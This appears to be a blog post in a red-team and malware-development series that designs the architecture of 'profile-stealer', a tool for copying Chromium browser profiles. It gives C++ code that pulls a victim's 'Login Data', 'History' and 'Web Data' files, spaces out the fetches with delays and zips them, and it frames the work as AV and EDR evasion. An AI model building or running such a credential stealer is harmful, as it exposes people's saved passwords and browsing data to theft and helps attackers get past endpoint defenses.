---
layout: post
title: Designing a Reusable Architecture for Bypass Methods
description: Defining a clean three-layer structure (BypassMethod, Downloader, Manager) so new extraction techniques can be added with minimal changes.
date: 2026-08-01T12:00:00-07:00
image: /assets/images/profile-stealer.png
categories:
  - red-teaming
  - malware-development
tags:
  - edr-evasion
  - av-evasion
  - chromium
  - profile-stealer
author: Drew Alleman
last_modified_at: 2026-08-01T12:00:00-07:00
---
In the previous post we built the `build.py` script that orchestrates the build process of [profile-stealer](https://github.com/Drew-Alleman/profile-stealer).

Now that the build system can inject different backends, we need a consistent structure for the extraction techniques themselves. Every extraction technique (bypass) follows the same four-step workflow. By standardizing that workflow, we can add new techniques later without touching the rest of the program.

We’ll also wire everything into `main.cpp`.
## Bypasses
Each bypass performs the same four-step workflow:
- Custom argument handling
- Iterate through a list of files
- Download each one (with a delay between)
- Create a zip archive of the downloaded files

What differs per bypass is the argument handling and the download mechanism itself.

Visually this workflow would look like the following:

![Showcase](/assets/images/Blank diagram - Page 1(4).png)

## Architecture
The download path is split across three types, each answering a different question:
- **`BypassMethod`**:  _what did the user ask for?_ Translates `argv` into validated, concrete objects.
- **`Downloader`**:  _how do we get one file?_ Request in, result out; knows nothing about the command line.
- **`Manager`**:  what do we do with a whole batch? Iteration, delay, zipping, cleanup.

Only `BypassMethod` ever touches the command line. `Manager` and `Downloader` never see a CLI type at all. You could delete CLI11 from the project and neither of them would change.

A new bypass therefore means only a new `BypassMethod` + `Downloader` pair (its own arguments, its own download logic) plugged into the same Manager.

## Wiring it into main
All concrete bypass methods live in `methods/bypass_methods/`. At build time, build.py copies the selected one into `src/bypass_methods/bypass.hpp`.

Every bypass needs some shared arguments (verbosity, log file, profile directory), and each one can also define its own arguments.

At the top of `main.cpp` we include the necessary headers:
```c++
#include <CLI/CLI.hpp>
#include "src/bypass_methods/bypass.hpp"   // overwritten at build time
#include "src/app/context.h"
```

Context is a simple object that stores the program’s configuration along with an output object for logging and console printing. We pass it to the bypass method so it has access to the user’s settings.

```c++
#pragma once
#include "console.h"
#include <filesystem>

class Command;
struct Context {
    Output                out;
    std::filesystem::path outputDir = ".";
    Command* selected = nullptr;
    std::string profileDirectory;
    bool kill = false;
};
```

Next we create the root CLI application and register the shared options:
```c++
int main(int argc, char** argv) {
    Context ctx;
    CLI::App cli{ "cross-platform chromium browser profile stealer" };
    cli.require_subcommand(1);
    cli.fallthrough();
    cli.add_flag("--verbose", ctx.out.verbose, "enable verbose output");
    cli.add_option("--log-file", ctx.out.logPath, "enables output logging to the specified file");
    cli.add_option("--profile", ctx.profileDirectory, "Full path to the root profile you want to copy. (e.g: -p 'C:\\Users\\drew\\AppData\\Local\\Google\\Chrome\\User\\Default')")
        ->required();
}
```

Finally we create the bypass object and let it register its own subcommand and arguments. The actual work only happens when CLI11_PARSE runs:


```c++
int main(int argc, char** argv) {
    // ... shared options above ...

    BypassMethod bypass;
    bypass.setup(cli, ctx);

    CLI11_PARSE(cli, argc, argv);
    return 0;
}
```

`CLI11_PARSE` processes the command line, fills in all the bound arguments, and triggers the selected subcommand.
## Downloader
`Downloader` is the base class each concrete bypass downloader implements.  It's the root logic for actually fetching files, and nothing else. `fetch()` performs a single download and returns a `DownloadResult`; `setup()` and `teardown()` bracket a batch for any per-run state.
```c
struct DownloadRequest {
    std::string input;      // source file path / URI to read
    std::string destFile;   // where to write it locally
};
struct DownloadResult {
    bool        ok = false;
    int         errorCode = 0;
    std::string detail;
    std::string filePath;
    std::size_t bytes = 0;
    explicit operator bool() const { return ok; }
};
class Downloader {
public:
    virtual ~Downloader() = default;
    virtual const char* name()  const = 0;
    virtual bool           setup() { return true; } // If we need to declare any intialization code for our downloader we put it here
    virtual bool           teardown() { return true; } // If we need to destroy objects created by our Downloader we do it here
    virtual DownloadResult fetch(const DownloadRequest& req) = 0;
};
```

The interface is deliberately narrow: a request names a source and a destination, and a result reports what happened. There's no notion of flags, subcommands, or archiving in here. A `Downloader` is handed one file at a time and reports back. Failure is _returned_ rather than printed, so the layers above decide how to surface it. 
## Manager
We create a `Manager` class to encapsulate the delay and the zipping of the downloaded files. It takes a `Downloader`, drives it across the file list, and archives the results.
```c++
#pragma once
#include "app/context.h"
#include "../common/download.hpp"
#include <vector>

class Manager {
public:
    explicit Manager(Context& ctx);
    void downloadProfile(Downloader& downloader); // this will handle delay and file iteration

private:
    Context& ctx;

    bool createZip(const std::string& zipPath, const std::vector<std::string>& files);
    void archiveAndCleanup(const std::vector<std::string>& files);
};
```

The only function I’ll explain in detail is  `downloadProfile()`. `createZip()` and `archiveAndCleanup()` are utility functions that use the [miniz](https://github.com/richgel999/miniz) library to compress the downloaded files. 

At the top we declare a vector of files to download called `IMPORTANT_FILES`.
```c++
static const std::vector<std::string> IMPORTANT_FILES = {
    "History",
    "Login Data",
    "Top Sites",
    "Web Data"
};
```

We start `downloadProfile()` by initializing the provided downloader: 
```c++
void Manager::downloadProfile(Downloader& downloader)
{
    if (!downloader.setup()) {
        ctx.out.error("failed to setup downloader: " + downloader.name());
        return;
    }

    ctx.out.verbosePrint("setup downloader:  " + downloader.name());
```

We create a vector to hold the successfully downloaded files, then loop through the list and build the absolute path using the `--profile` argument.

```c
    std::vector<std::string> downloadedFiles;

    for (const auto& file : IMPORTANT_FILES) { // start of download loop
        DownloadRequest req;
        
        // Create the absolute path:
        req.input = (std::filesystem::path(ctx.profileDirectory) / file).generic_string();
        req.destFile = file;
```

`fetch()` is called passing the created `DownloadRequest`  object, capturing the result as our defined `DownloadResult`. 

```c
        ctx.out.verbosePrint("attempting to download:  " + req.input);

        DownloadResult result = downloader.fetch(req);

        ctx.out.verbosePrint("finished download");
```

If any errors occur we can print out the detail message stored in the result object:
```c++
        if (!result.ok) {
            ctx.out.error("failed to download '" + req.input + "' REASON: ") + result.detail);
        }
        else {
            ctx.out.print("downloaded: " + req.input + " (" + std::to_string(result.bytes) + " bytes)");
            downloadedFiles.push_back(result.filePath);
        }

        sleepMs(); // sleep with injected method
    }
```

Finally we teardown the downloader and zip the downloaded files:
```c++
    downloader.teardown(); 
    // Clean separation of concerns
    archiveAndCleanup(downloadedFiles);
    
} // end of Manager::downloadProfile()

```
## BypassMethod
Every bypass is a self-contained unit, injected at build time, called `BypassMethod`.
```c++
class BypassMethod {
public:
    void setup(CLI::App& cli, Context& ctx);
    void run(Context& ctx);

private:
    std::string launch; // this is the browser to launch. The value is populated from a command line argument in setup().
};
```

It exposes the same two functions:
- setup:  registers its CLI subcommand and binds its arguments
- run: executes the download

```c++
inline void BypassMethod::setup(CLI::App& cli, Context& ctx)  {
	// Register the term 'windowspos' as a subcommand
    auto* sub = cli.add_subcommand(
        "windowspos",
        "");
    // add a custom argument to this subcommand and save it to the private attribute launch
    sub->add_option("-L,--launch", launch,
        "The browser to use when downloading the files. "
        "Usage: -L <browser>, e.g. -L chrome, -L brave, or -L edge.")
        ->required();
    
    // runs bypass.run() if windowspos is selected
    sub->callback([this, &ctx]() { run(ctx); });
}


// This is the method that actually runs the downloader.
inline void BypassMethod::run(Context& ctx) {
    std::optional<Browser> browser = browserFromName(launch);
    if (!browser) {
        ctx.out.error("unknown browser name '" + launch + "'");
        return;
    }

    auto path = resolveBrowser(*browser);
    if (!path) {
        ctx.out.error("browser '" + launch +
            "' is not installed, or its executable could not be found");
        return;
    }

    Manager mgr(ctx);
    WindowposDownloader downloader(ctx, path.value());
    mgr.downloadProfile(downloader);
}
```
## Conclusion
This three-layer design keeps the concerns cleanly separated: `BypassMethod` owns the command-line surface, `Downloader `owns the actual fetch logic, and `Manager` owns the batch orchestration and packaging.

Because the Manager never knows how a file is obtained, and the Downloader never knows about CLI arguments or zipping, adding a new bypass is reduced to writing one new pair of classes and plugging them into the existing machinery. The rest of the system stays untouched.

In the next post we’ll implement the first concrete bypass using this structure.